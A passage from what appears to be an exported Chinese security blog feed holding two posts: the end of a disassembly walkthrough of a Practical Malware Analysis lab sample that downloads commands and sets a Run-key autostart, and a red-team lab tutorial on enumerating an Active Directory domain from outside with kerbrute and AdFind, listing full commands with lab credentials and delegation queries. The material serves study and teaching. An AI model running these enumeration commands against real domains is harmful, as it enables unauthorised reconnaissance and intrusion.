[ebp+phkResult]</span><br><span class="line">.text:004011BA                 push    edx             ; hKey</span><br><span class="line">.text:004011BB                 call    ds:RegSetValueExA</span><br><span class="line">.text:004011C1                 test    eax, eax</span><br><span class="line">.text:004011C3                 jz      short loc_4011D2</span><br><span class="line">.text:004011C5                 push    offset aError31CouldNo ; &quot;Error 3.1: Could not set Registry value&quot;...</span><br><span class="line">.text:004011CA                 call    sub_401271</span><br><span class="line">.text:004011CF                 add     esp, 4</span><br><span class="line">.text:004011D2</span><br><span class="line">.text:004011D2 loc_4011D2:                             ; CODE XREF: sub_401130+93↑j</span><br><span class="line">.text:004011D2                 jmp     short loc_4011EE</span><br><span class="line">.text:004011D4 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:004011D4</span><br><span class="line">.text:004011D4 loc_4011D4:                             ; CODE XREF: sub_401130+23↑j</span><br><span class="line">.text:004011D4                                         ; DATA XREF: .text:jpt_401153↓o</span><br><span class="line">.text:004011D4                 push    186A0h          ; jumptable 00401153 case 101</span><br><span class="line">.text:004011D9                 call    ds:Sleep</span><br><span class="line">.text:004011DF                 jmp     short loc_4011EE</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a：调用createdirectory函数，参数是 C:\\Temp，如果该目录不存在，则创建该目录</span><br><span class="line">b：调用copy file函数，两个参数分别是源文件（argv[0]即目标程序）和目的文件（C:\\Temp\cc.exe）</span><br><span class="line">c：调用deletefile函数，当 C:\\Temp\cc.exe 文件存在时删除它</span><br><span class="line">d：调用 RegSet ValueExA和 RegOpenKeyExA 在注册表中添加开机自启，即将Software\Microsoft Windows \CurrentVersion\Run\Malware 的值添加为C:\\Temp\cc.exe,这样目标机器每次开机时都会启动该恶意程序 </span><br><span class="line">e：调用sleep函数，参数100s</span><br></pre></td></tr></table></figure>



<h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>该程序的主要功能也了然于胸了，首先 if 判断是否联网，不联网程序终止。联网的话程序会去下载一个网页，其中包含了html的注释头部，并解析出第一个字符，用来校验switch的参数，决定执行哪条语句（创建目录/拷贝文件/删除文件/修改注册表/sleep）</p>
<h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><h4 id="详细分析-3"><a href="#详细分析-3" class="headerlink" title="详细分析"></a>详细分析</h4><p>首先还是先看下导入表，和前面一样，并没有多余的改变。</p>
<p><img src="/2021/11/04/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%9C%8B%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E7%9A%84C%E8%AF%AD%E8%A8%80%E7%BB%93%E6%9E%84/image-20211026005112318.png" alt="image-20211026005112318"></p>
<p><img src="/2021/11/04/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%9C%8B%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E7%9A%84C%E8%AF%AD%E8%A8%80%E7%BB%93%E6%9E%84/image-20211026005218171.png" alt="image-20211026005218171"></p>
<p>字符串的唯一变化就是多了 Internet Explorer 7.5 ，看来是多了个 user-agent 代理</p>
<p><img src="/2021/11/04/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%9C%8B%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E7%9A%84C%E8%AF%AD%E8%A8%80%E7%BB%93%E6%9E%84/image-20211026005746253.png" alt="image-20211026005746253"></p>
<p>相同的这些就不说了，来看看不同点有哪些</p>
<p>来到main函数这里，也是很多相同的函数，401000（判断Internet是否连接），401040（解析HTML），4012b5（printf函数），401150（switch语句）</p>
<p><img src="/2021/11/04/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%9C%8B%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E7%9A%84C%E8%AF%AD%E8%A8%80%E7%BB%93%E6%9E%84/image-20211026010144588.png" alt="image-20211026010144588"></p>
<p><img src="/2021/11/04/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%9C%8B%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E7%9A%84C%E8%AF%AD%E8%A8%80%E7%BB%93%E6%9E%84/image-20211026010305611.png" alt="image-20211026010305611"></p>
<p><img src="/2021/11/04/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%9C%8B%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E7%9A%84C%E8%AF%AD%E8%A8%80%E7%BB%93%E6%9E%84/image-20211026010412326.png" alt="image-20211026010412326"></p>
<p>而当我们看整个函数视图的时候，发现了一个向上的箭头，很明显出现了循环</p>
<p><img src="/2021/11/04/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%9C%8B%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E7%9A%84C%E8%AF%AD%E8%A8%80%E7%BB%93%E6%9E%84/image-20211026011002118.png" alt="image-20211026011002118"></p>
<p>那就来分析下这段循环结构</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00401248 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401248</span><br><span class="line">.text:00401248 loc_401248:                             ; CODE XREF: _main+12↑j</span><br><span class="line">.text:00401248                 mov     [ebp+var_C], 0</span><br><span class="line">.text:0040124F                 jmp     short loc_40125A</span><br><span class="line">.text:00401251 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401251</span><br><span class="line">.text:00401251 loc_401251:                             ; CODE XREF: _main+7D↓j</span><br><span class="line">.text:00401251                 mov     eax, [ebp+var_C]</span><br><span class="line">.text:00401254                 add     eax, 1</span><br><span class="line">.text:00401257                 mov     [ebp+var_C], eax</span><br><span class="line">.text:0040125A</span><br><span class="line">.text:0040125A loc_40125A:                             ; CODE XREF: _main+1F↑j</span><br><span class="line">.text:0040125A                 cmp     [ebp+var_C], 5A0h</span><br><span class="line">.text:00401261                 jge     short loc_4012AF</span><br><span class="line">.text:00401263                 mov     ecx, [ebp+var_C]</span><br><span class="line">.text:00401266                 push    ecx</span><br><span class="line">.text:00401267                 call    sub_401040</span><br><span class="line">.text:0040126C                 add     esp, 4</span><br><span class="line">.text:0040126F                 mov     [ebp+var_8], al</span><br><span class="line">.text:00401272                 movsx   edx, [ebp+var_8]</span><br><span class="line">.text:00401276                 test    edx, edx</span><br><span class="line">.text:00401278                 jnz     short loc_40127E</span><br><span class="line">.text:0040127A                 xor     eax, eax</span><br><span class="line">.text:0040127C                 jmp     short loc_4012B1</span><br><span class="line">.text:0040127E ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040127E</span><br><span class="line">.text:0040127E loc_40127E:                             ; CODE XREF: _main+48↑j</span><br><span class="line">.text:0040127E                 movsx   eax, [ebp+var_8]</span><br><span class="line">.text:00401282                 push    eax</span><br><span class="line">.text:00401283                 push    offset aSuccessParsedC ; &quot;Success: Parsed command is %c\n&quot;</span><br><span class="line">.text:00401288                 call    sub_4012B5</span><br><span class="line">.text:0040128D                 add     esp, 8</span><br><span class="line">.text:00401290                 mov     ecx, [ebp+argv]</span><br><span class="line">.text:00401293                 mov     edx, [ecx]</span><br><span class="line">.text:00401295                 push    edx             ; lpExistingFileName</span><br><span class="line">.text:00401296                 mov     al, [ebp+var_8]</span><br><span class="line">.text:00401299                 push    eax             ; char</span><br><span class="line">.text:0040129A                 call    sub_401150</span><br><span class="line">.text:0040129F                 add     esp, 8</span><br><span class="line">.text:004012A2                 push    0EA60h          ; dwMilliseconds</span><br><span class="line">.text:004012A7                 call    ds:Sleep</span><br><span class="line">.text:004012AD                 jmp     short loc_401251</span><br></pre></td></tr></table></figure>

<p>很明显，var_c 是用来循环计数的，在 4012AD 处 jmp 401251，返回递增，如果大于5A0h(1440d) 就在401261处跳出循环到 4012AF，循环结束.否则程序接着运行，在401263处开始。将ecx（var_c） push入栈，接着调用401040（解析html）函数，然后慢慢执行，在4012A7 处调用sleep函数，参数是 EA60h（60000d），即1分钟，所以这个程序会sleep 1440 分钟（24小时）</p>
<p>在上一个程序中，401040 处并没有参数，而这里传入了 arg_0 作为参数，并且是唯一的参数，而在调用 401040 前，push进了ecx，即var_c，所以这里的arg_0 就是var_c（计数器），push arg_0入栈后，接着push了  Internet Explorer 7.50/pma%d 字符串，和 szAgent的地址。然后调用_sprintf 函数，用来将格式化的数据写入字符串，并存储在szAgent 中。然后在40106a调用 INternetOpen 函数，传入的参数是 szAgent，也就是说，每次var_C 计数器增加后， user-agent长度也会随之改变。这里就可以用来监测该程序运行了多长时间。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">text:00401040                 push    ebp</span><br><span class="line">.text:00401041                 mov     ebp, esp</span><br><span class="line">.text:00401043                 sub     esp, 230h</span><br><span class="line">.text:00401049                 mov     eax, [ebp+arg_0]</span><br><span class="line">.text:0040104C                 push    eax</span><br><span class="line">.text:0040104D                 push    offset Format   ; &quot;Internet Explorer 7.50/pma%d&quot;</span><br><span class="line">.text:00401052                 lea     ecx, [ebp+szAgent]</span><br><span class="line">.text:00401055                 push    ecx             ; Buffer</span><br><span class="line">.text:00401056                 call    _sprintf</span><br><span class="line">.text:0040105B                 add     esp, 0Ch</span><br><span class="line">.text:0040105E                 push    0               ; dwFlags</span><br><span class="line">.text:00401060                 push    0               ; lpszProxyBypass</span><br><span class="line">.text:00401062                 push    0               ; lpszProxy</span><br><span class="line">.text:00401064                 push    0               ; dwAccessType</span><br><span class="line">.text:00401066                 lea     edx, [ebp+szAgent]</span><br><span class="line">.text:00401069                 push    edx             ; lpszAgent</span><br><span class="line">.text:0040106A                 call    ds:InternetOpenA</span><br><span class="line">.text:00401070                 mov     [ebp+hInternet], eax</span><br><span class="line">.text:00401073                 push    0               ; dwContext</span><br><span class="line">.text:00401075                 push    0               ; dwFlags</span><br><span class="line">.text:00401077                 push    0               ; dwHeadersLength</span><br><span class="line">.text:00401079                 push    0               ; lpszHeaders</span><br><span class="line">.text:0040107B                 push    offset szUrl    ; &quot;http://www.practicalmalwareanalysis.com&quot;...</span><br><span class="line">.text:00401080                 mov     eax, [ebp+hInternet]</span><br><span class="line">.text:00401083                 push    eax             ; hInternet</span><br><span class="line">.text:00401084                 call    ds:InternetOpenUrlA</span><br><span class="line">.text:0040108A                 mov     [ebp+hFile], eax</span><br><span class="line">.text:0040108D                 cmp     [ebp+hFile], 0</span><br><span class="line">.text:00401091                 jnz     short loc_4010B1</span><br><span class="line">.text:00401093                 push    offset aError21FailToO ; &quot;Error 2.1: Fail to OpenUrl\n&quot;</span><br><span class="line">.text:00401098                 call    sub_4012B5</span><br><span class="line">.text:0040109D                 add     esp, 4</span><br><span class="line">.text:004010A0                 mov     ecx, [ebp+hInternet]</span><br><span class="line">.text:004010A3                 push    ecx             ; hInternet</span><br><span class="line">.text:004010A4                 call    ds:InternetCloseHandle</span><br><span class="line">.text:004010AA                 xor     al, al</span><br><span class="line">.text:004010AC                 jmp     loc_401140</span><br></pre></td></tr></table></figure>



<h3 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h3><p>首先，程序会使用if结构检查是否建立连接。如果无，程序终止运行。否则，程序使用<br>一个上面提到的的User-Agent 来下载一个html， 这个User-Agent包含了一个循环结构的计数器，用于向attacker显示程序已<br>经运行了多长时间。下载的网页中包含了以&lt;!–开头的html注释代码，这段注释代码中<br>接下来的第一个字符被用于一个switch语句，以决定接下来在本地系统的行为。包括删除文件、创建个目录、 设置一个注册表run键、复制文件、休眠100秒等。最终该程序会运行24小时后终止。</p>
<h2 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h2><p>通过简单的反汇编看简单恶意文件的C语言结构就先到这里，思路我上面都有提到，更复杂的我也正在慢慢学习，如有不足，欢迎师傅们斧正。</p>
<p>Peace.</p>
]]></content>
      <categories>
        <category>木马分析</category>
      </categories>
      <tags>
        <tag>病毒</tag>
        <tag>反汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>域外对域内的信息收集</title>
    <url>/2021/10/04/%E5%9F%9F%E5%A4%96%E5%AF%B9%E5%9F%9F%E5%86%85%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<p>  很多时候为了避免在目标机器产生太大的动静，或者被AV检测到，经常通过socks代理在本地进行信息收集，但会产生大量的socks流量，容易被edr检测到。</p>
<h3 id="0x01-通过-kerbrute-枚举"><a href="#0x01-通过-kerbrute-枚举" class="headerlink" title="0x01 通过 kerbrute 枚举"></a>0x01 通过 kerbrute 枚举</h3><p>下载地址：<a href="https://github.com/ropnop/kerbrute">https://github.com/ropnop/kerbrute</a></p>
<p>原理: </p>
<p>通过模拟 <code>AS_REQ</code> 向 <code>KDC</code> 请求，如果 <code>KDC</code> 返回的是 <code>KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN</code> 错误的话， 则说明该域⽤户不存在，如果 <code>KDC</code> 返回并提示 <code>KRB5KDC_ERR_PREAUTH_REQUIRED (预身份验证)</code>，那么就说明该域⽤户是存在的</p>
<p>主要利用了 <code>Kerberos</code> 协议的预身份验证，预身份验证指的是 <code>client</code> 在发出票证之前已通过 KDC 的身份验证。</p>
<p>kerbrute的语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerbrute.exe userenum -d 域名 字典.txt --dc 域控IP</span><br><span class="line">kerbrute_windows_386.exe userenum -d sun.com user.txt --dc 192.168.138.138</span><br></pre></td></tr></table></figure>

<p><img src="/2021/10/04/%E5%9F%9F%E5%A4%96%E5%AF%B9%E5%9F%9F%E5%86%85%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20211004151523096.png" alt="image-20211004151523096"></p>
<p><img src="/2021/10/04/%E5%9F%9F%E5%A4%96%E5%AF%B9%E5%9F%9F%E5%86%85%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20211004110918710.png" alt="image-20211004110918710"></p>
<h3 id="0x02-ADfind-搜集域内各类信息"><a href="#0x02-ADfind-搜集域内各类信息" class="headerlink" title="0x02 ADfind 搜集域内各类信息"></a>0x02 ADfind 搜集域内各类信息</h3><p>下载地址：<a href="https://www.softpedia.com/get/Programming/Other-Programming-Files/AdFind.shtml">https://www.softpedia.com/get/Programming/Other-Programming-Files/AdFind.shtml</a></p>
<p>各种cs插件已经集成了此工具，z1等等。当然已经被AV杀烂了</p>
<p>使用方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adfind.exe -help</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">AdFind V01<span class="number">.52</span><span class="number">.00</span><span class="function">cpp Joe <span class="title">Richards</span> <span class="params">(support@joeware.net)</span> January 2020</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">-help         Basic help.</span></span><br><span class="line"><span class="function">-?            Basic help.</span></span><br><span class="line"><span class="function">-??           Advanced/Expert help.</span></span><br><span class="line"><span class="function">-????         Shortcut help.</span></span><br><span class="line"><span class="function">-sc?          Shortcut help.</span></span><br><span class="line"><span class="function">-meta?        Metadata help.</span></span><br><span class="line"><span class="function">-regex?       Regular Expressions help.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Usage:</span></span><br><span class="line"><span class="function"> AdFind [switches] [-b basedn] [-f filter] [attr list]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">   basedn        RFC <span class="number">2253</span> DN to base search from.</span></span><br><span class="line"><span class="function">                 If no base specified, defaults to default NC.</span></span><br><span class="line"><span class="function">                 Base DN can also be specified as a SID, GUID, or IID.</span></span><br><span class="line"><span class="function">   filter        RFC <span class="number">2254</span> LDAP filter.</span></span><br><span class="line"><span class="function">                 If no filter specified, defaults to objectclass=</span>*.</span><br><span class="line">   attr list     List of specific attributes to <span class="keyword">return</span>, <span class="keyword">if</span> nothing specified</span><br><span class="line">                 returns <span class="string">&#x27;default&#x27;</span> attributes, aka * set.</span><br><span class="line"></span><br><span class="line">  Switches: (designated by - <span class="keyword">or</span> /)</span><br><span class="line"></span><br><span class="line">           [CONNECTION OPTIONS]</span><br><span class="line">   -h host:port  Host <span class="keyword">and</span> port to use. If <span class="keyword">not</span> specified uses port <span class="number">389</span> on</span><br><span class="line">                 <span class="keyword">default</span> LDAP server. Localhost can be specified as <span class="string">&#x27;.&#x27;</span>.</span><br><span class="line">                 Port can also be specified via -p <span class="keyword">and</span> -gc.</span><br><span class="line">                 IPv6 IP address w/ port is specified [address]:port</span><br><span class="line">   -gc           Search Global <span class="built_in">Catalog</span> (port <span class="number">3268</span>).</span><br><span class="line">   -p port       Alternate method to specify port to connect to.</span><br><span class="line"></span><br><span class="line">           [QUERY OPTIONS]</span><br><span class="line">   -s scope      Scope of search. Base, One[Level], Sub[tree].</span><br><span class="line">   -t xxx        Timeout value <span class="keyword">for</span> query, <span class="keyword">default</span> <span class="number">120</span> seconds.</span><br><span class="line"></span><br><span class="line">           [OUTPUT OPTIONS]</span><br><span class="line">   -c            Object count only.</span><br><span class="line">   -dn           Object DN<span class="number">&#x27;</span>s only.</span><br><span class="line">   -appver       Output AdFind versioning info.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  Notes:</span><br><span class="line">    o This tool was written with simple US ASCII in mind. UNICODE <span class="keyword">and</span> special</span><br><span class="line">      ASCII characters such as characters with umlauts <span class="keyword">or</span> graphics may <span class="keyword">not</span></span><br><span class="line">      be output correctly due to how the command prompt handles those</span><br><span class="line">      characters. If you see <span class="keyword">this</span> occurring, redirect the output to a text file</span><br><span class="line">      with the command prompt redirection <span class="built_in">symbol</span> (&gt;) <span class="keyword">and</span> it is possible the</span><br><span class="line">      program will give the desired output.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  Ex1:</span><br><span class="line">    adfind -b dc=joehome,dc=net -f <span class="string">&quot;objectcategory=computer&quot;</span></span><br><span class="line">      Find all computer objects in joehome.net <span class="keyword">and</span> displays all attributes</span><br><span class="line"></span><br><span class="line">  Ex2:</span><br><span class="line">    adfind -b dc=joehome,dc=net -f <span class="string">&quot;objectcategory=computer&quot;</span> cn createTimeStamp</span><br><span class="line">      Find all computer objects in joehome.net <span class="keyword">and</span> displays cn <span class="keyword">and</span> createTimeStamp</span><br><span class="line"></span><br><span class="line">  Ex3:</span><br><span class="line">    adfind -h .:<span class="number">50000</span> -b cn=ab -f <span class="string">&quot;objectcategory=person&quot;</span></span><br><span class="line">      Find all person objects on cn=ab container of local ADAM instance</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> This software is Freeware. Use at your own risk.</span><br><span class="line"> I <span class="keyword">do</span> <span class="keyword">not</span> warrant <span class="keyword">this</span> software to be fit <span class="keyword">for</span> any purpose <span class="keyword">or</span> use <span class="keyword">and</span></span><br><span class="line"> I <span class="keyword">do</span> <span class="keyword">not</span> guarantee that it will <span class="keyword">not</span> damage <span class="keyword">or</span> destroy your system.</span><br><span class="line"> Contact support@joeware.net via email <span class="keyword">for</span> licensing information to package</span><br><span class="line"> <span class="keyword">this</span> utility in commercial products.</span><br><span class="line"></span><br><span class="line"> See full Warranty documentation <span class="keyword">or</span> download the latest version</span><br><span class="line"> on http:<span class="comment">//www.joeware.net.</span></span><br><span class="line"></span><br><span class="line"> If you have improvement ideas, bugs, <span class="keyword">or</span> just wish to say Hi, I</span><br><span class="line"> receive email <span class="number">24</span>x7 <span class="keyword">and</span> read it in a semi-regular timeframe.</span><br><span class="line"> You can usually find me at support@joeware.net</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>以下靶场使用的是 saulGoodman 师傅搭建的靶场，在操作过程中可能会因为靶场问题出现一点意外情况，本文仅展示方法。</p>
<p><img src="/2021/10/04/%E5%9F%9F%E5%A4%96%E5%AF%B9%E5%9F%9F%E5%86%85%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20211004164912444.png" alt="image-20211004164912444"></p>
<p>这里获取到了 web-2012 机器的控制权限，并成功提权抓到了密码，接下来就通过抓到的⽤户去对域内进⾏枚举信息搜集。</p>
<h5 id="获取域内用户列表信息"><a href="#获取域内用户列表信息" class="headerlink" title="获取域内用户列表信息"></a>获取域内用户列表信息</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adfind.exe -h 10.10.10.10 -u redteam\saulgoodman -up Saul!@#456 -b dc=redteam,dc=com -f &quot;objectcategory=user&quot;</span><br></pre></td></tr></table></figure>



<p><img src="/2021/10/04/%E5%9F%9F%E5%A4%96%E5%AF%B9%E5%9F%9F%E5%86%85%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20211004163921268.png" alt="image-20211004163921268"></p>
<h5 id="查询组信息"><a href="#查询组信息" class="headerlink" title="查询组信息"></a>查询组信息</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adfind.exe -h 10.10.10.10 -u redteam\saulgoodman -up Saul!@#456 -b dc=redteam,dc=com -f &quot;objectcategory=group&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/10/04/%E5%9F%9F%E5%A4%96%E5%AF%B9%E5%9F%9F%E5%86%85%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20211004164431707.png" alt="image-20211004164431707"></p>
<h5 id="获取完整OU信息"><a href="#获取完整OU信息" class="headerlink" title="获取完整OU信息"></a>获取完整OU信息</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adfind.exe -h 10.10.10.10 -u redteam\saulgoodman -up Saul!@#456 -default -f</span><br><span class="line">&quot;objectcategory=organizationalUnit&quot; name whenCreated</span><br></pre></td></tr></table></figure>

<p><img src="/2021/10/04/%E5%9F%9F%E5%A4%96%E5%AF%B9%E5%9F%9F%E5%86%85%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20211004164750101.png" alt="image-20211004164750101"></p>
<h5 id="获取指定-OU-下的⽤户信息"><a href="#获取指定-OU-下的⽤户信息" class="headerlink" title="获取指定 OU 下的⽤户信息"></a>获取指定 OU 下的⽤户信息</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adfind.exe -h 10.10.10.10 -u redteam\saulgoodman -up Saul!@#456 &quot;OU=内⽹安全组,DC=redteam,DC=com&quot; -s subtree -f &quot;(objectcategory=user)&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/10/04/%E5%9F%9F%E5%A4%96%E5%AF%B9%E5%9F%9F%E5%86%85%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20211004165056877.png" alt="image-20211004165056877"></p>
<h5 id="获取指定OU下的用户组信息"><a href="#获取指定OU下的用户组信息" class="headerlink" title="获取指定OU下的用户组信息"></a>获取指定OU下的用户组信息</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adfind.exe -h 10.10.10.10 -u redteam\saulgoodman -up Saul!@#456 &quot;OU=渗透攻击红队,DC=redteam,DC=com&quot; -s subtree -f &quot;(objectcategory=group)&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/10/04/%E5%9F%9F%E5%A4%96%E5%AF%B9%E5%9F%9F%E5%86%85%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20211004165302903.png" alt="image-20211004165302903"></p>
<h5 id="获取指定OU下的机器名信息"><a href="#获取指定OU下的机器名信息" class="headerlink" title="获取指定OU下的机器名信息"></a>获取指定OU下的机器名信息</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adfind.exe -h 10.10.10.10 -u redteam\saulgoodman -up Saul!@#456 &quot;OU=内网安全组,DC=redteam,DC=com&quot; -s subtree -f &quot;(objectcategory=computer)&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/10/04/%E5%9F%9F%E5%A4%96%E5%AF%B9%E5%9F%9F%E5%86%85%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20211004165730301.png" alt="image-20211004165730301"></p>
<h5 id="获取完整机器列表信息"><a href="#获取完整机器列表信息" class="headerlink" title="获取完整机器列表信息"></a>获取完整机器列表信息</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adfind.exe -h 10.10.10.10 -u redteam\saulgoodman -up Saul!@#456 -b dc=redteam,dc=com -f &quot;objectcategory=computer&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/10/04/%E5%9F%9F%E5%A4%96%E5%AF%B9%E5%9F%9F%E5%86%85%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20211004170237773.png" alt="image-20211004170237773"></p>
<h5 id="查询域内非约束委派（机器账户）"><a href="#查询域内非约束委派（机器账户）" class="headerlink" title="查询域内非约束委派（机器账户）"></a>查询域内非约束委派（机器账户）</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adfind.exe -h 10.10.10.10 -u redteam\saulgoodman -up Saul!@#456 -b &quot;DC=redteam,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369) (userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>

<p><img src="/2021/10/04/%E5%9F%9F%E5%A4%96%E5%AF%B9%E5%9F%9F%E5%86%85%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20211004170432612.png" alt="image-20211004170432612"></p>
<h5 id="查询域内非约束委派（服务账户）"><a href="#查询域内非约束委派（服务账户）" class="headerlink" title="查询域内非约束委派（服务账户）"></a>查询域内非约束委派（服务账户）</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adfind.exe -h 10.10.10.10 -u redteam\saulgoodman -up Saul!@#456 -b &quot;DC=redteam,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368) (userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>

<p><img src="/2021/10/04/%E5%9F%9F%E5%A4%96%E5%AF%B9%E5%9F%9F%E5%86%85%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20211004170729013.png" alt="image-20211004170729013"></p>
<h5 id="查询域内约束委派（机器账户）"><a href="#查询域内约束委派（机器账户）" class="headerlink" title="查询域内约束委派（机器账户）"></a>查询域内约束委派（机器账户）</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adFind.exe -h 10.10.10.10 -u redteam\saulgoodman -up Saul!@#456 -b &quot;DC=redteam,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; msDS-AllowedToDelegateTo</span><br></pre></td></tr></table></figure>

<p><img src="/2021/10/04/%E5%9F%9F%E5%A4%96%E5%AF%B9%E5%9F%9F%E5%86%85%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20211004170848717.png" alt="image-20211004170848717"></p>
<h5 id="查询域内约束委派（服务账户"><a href="#查询域内约束委派（服务账户" class="headerlink" title="查询域内约束委派（服务账户)"></a>查询域内约束委派（服务账户)</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adFind.exe -h 10.10.10.10 -u redteam\saulgoodman -up Saul!@#456 -b &quot;DC=redteam,DC=com&quot; -f &quot;(&amp;(objectCategory=computer)(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=16777216))&quot; msDS-AllowedToDelegateTo</span><br></pre></td></tr></table></figure>

<p><img src="/2021/10/04/%E5%9F%9F%E5%A4%96%E5%AF%B9%E5%9F%9F%E5%86%85%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20211004171247026.png" alt="image-20211004171247026"></p>
<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p><code>Adfind</code> 这款工具主要是基于 <code>LDAP协议</code> 来进行信息收集，帮助更快认识域的组成结构。</p>
<p>几个常见的 LDAP 端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">389/LDAP</span><br><span class="line">636/LDAP SSL</span><br><span class="line">3268/LDAP GC</span><br><span class="line">3269/LDAP GC SSL</span><br></pre></td></tr></table></figure>

<p>AD 与 LDAP 的关系：LDAP 是⼀种⽤来访问 AD 数据库的⽬录服务协议，AD DS 会通过 LDAP 名称路径来表示对象在 AD 数据库中的位置，以便⽤它来访问 AD 数据库内的对象。LDAP 的名称路径包括有 DN、RDN。</p>
<h3 id="通过-Ad-Explorer-图形化查看域内各类信息"><a href="#通过-Ad-Explorer-图形化查看域内各类信息" class="headerlink" title="通过 Ad Explorer 图形化查看域内各类信息"></a>通过 Ad Explorer 图形化查看域内各类信息</h3><p>AD Explorer是独⽴的可执⾏⽂件，⽆需安装就可以使⽤。使⽤前⾸先需要⼀个域帐户（任何⼀个域帐户都可以 ），可以利⽤该账户与域控制器通信并⽤它枚举域。它能够列出域组织架构，⽤户帐户，计算机帐户等。它可以 帮助你寻找特权⽤户和数据库服务器等敏感⽬标。</p>
<p>Ad Explorer 下载地址：<a href="http://live.sysinternals.com/">http://live.sysinternals.com/</a></p>
<p>在拥有域成员账号和域控IP的情况下，可以查看域内信息</p>
<p><img src="/2021/10/04/%E5%9F%9F%E5%A4%96%E5%AF%B9%E5%9F%9F%E5%86%85%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20211004191448383.png" alt="image-20211004191448383"></p>
<p><img src="/2021/10/04/%E5%9F%9F%E5%A4%96%E5%AF%B9%E5%9F%9F%E5%86%85%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20211004205940107.png" alt="image-20211004205940107"></p>
